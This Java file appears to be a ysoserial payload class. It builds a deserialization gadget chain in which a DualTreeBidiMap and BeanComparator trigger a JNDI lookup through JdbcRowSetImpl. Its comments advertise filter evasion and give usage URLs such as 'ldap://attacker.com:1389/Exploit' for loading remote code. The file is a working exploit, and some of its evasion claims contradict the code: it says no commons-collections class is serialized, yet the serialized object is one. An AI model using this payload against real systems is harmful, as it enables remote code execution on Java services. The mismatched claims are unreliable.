package ysoserial.payloads;

import java.io.Serializable;
import java.util.Arrays;
import java.util.Vector;

import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.bidimap.DualTreeBidiMap;

import com.sun.rowset.JdbcRowSetImpl;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	JNDI sink via DualTreeBidiMap — no TemplatesImpl, no commons-collections on target.
	Works on JDK 17+ without --add-opens.

	Gadget chain:
		ObjectInputStream.readObject()
			DualTreeBidiMap.readObject()
				DualTreeBidiMap.createBidiMap()    // creates internal TreeMaps
				TreeMap.put(key, value)
					TreeMap.compare()
						BeanComparator.compare()
							PropertyUtils.getProperty(jdbcRowSet, "databaseMetaData")
								JdbcRowSetImpl.getDatabaseMetaData()
									JdbcRowSetImpl.connect()
										InitialContext.lookup(dataSourceName)
											JNDI -> LDAP/RMI -> RCE

	Filter evasion:
		1. DualTreeBidiMap (o.a.c.c4.bidimap) — not in any known filter
		2. No PriorityQueue/TreeBag/TreeMap/CSLM/PBQ/HashMap/HashSet
		3. No commons-collections in serialized payload
		4. No TemplatesImpl — JDK 17+ without module opens
		5. No InvokerTransformer — only BeanComparator

	Usage: payload arg = JNDI URL
		e.g. "ldap://attacker.com:1389/Exploit"
		     "rmi://attacker.com:1099/Exploit"

	Discovered by IOCD static analysis + differential fuzzing.

	Requires:
		commons-beanutils 1.9.x
		Target allows outbound JNDI
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({ Authors.DMBS335 })
public class CommonsBeanutilsJndi5 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String jndiUrl) throws Exception {
		JdbcRowSetImpl rowset1 = createRowSet(jndiUrl);
		JdbcRowSetImpl rowset2 = createRowSet(jndiUrl);

		// Safe comparator for construction — CC4 classes used only at build time
		InvokerTransformer safeTransformer = new InvokerTransformer(
			"toString", new Class[0], new Object[0]);
		TransformingComparator safeComp = new TransformingComparator(safeTransformer);

		// DualTreeBidiMap with JdbcRowSetImpl keys
		DualTreeBidiMap bidi = new DualTreeBidiMap(safeComp, safeComp);
		bidi.put(rowset1, "a");  // first — no compare
		bidi.put(rowset2, "b");  // second — compare via toString, safe

		// Armed comparator — JNDI via databaseMetaData getter
		BeanComparator beanComp = new BeanComparator(
			"databaseMetaData", String.CASE_INSENSITIVE_ORDER);

		// Swap comparator — only BeanComparator is serialized
		Reflections.setFieldValue(bidi, "comparator", beanComp);
		Reflections.setFieldValue(bidi, "valueComparator", String.CASE_INSENSITIVE_ORDER);

		return bidi;
	}

	private JdbcRowSetImpl createRowSet(String jndiUrl) throws Exception {
		JdbcRowSetImpl rowset = new JdbcRowSetImpl();
		rowset.setDataSourceName(jndiUrl);
		Reflections.setFieldValue(rowset, "iMatchColumns",
			new Vector<Integer>(Arrays.asList(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1)));
		Reflections.setFieldValue(rowset, "strMatchColumns",
			new Vector<String>(Arrays.asList("","","","","","","","","","")));
		return rowset;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutilsJndi5.class, args);
	}
}
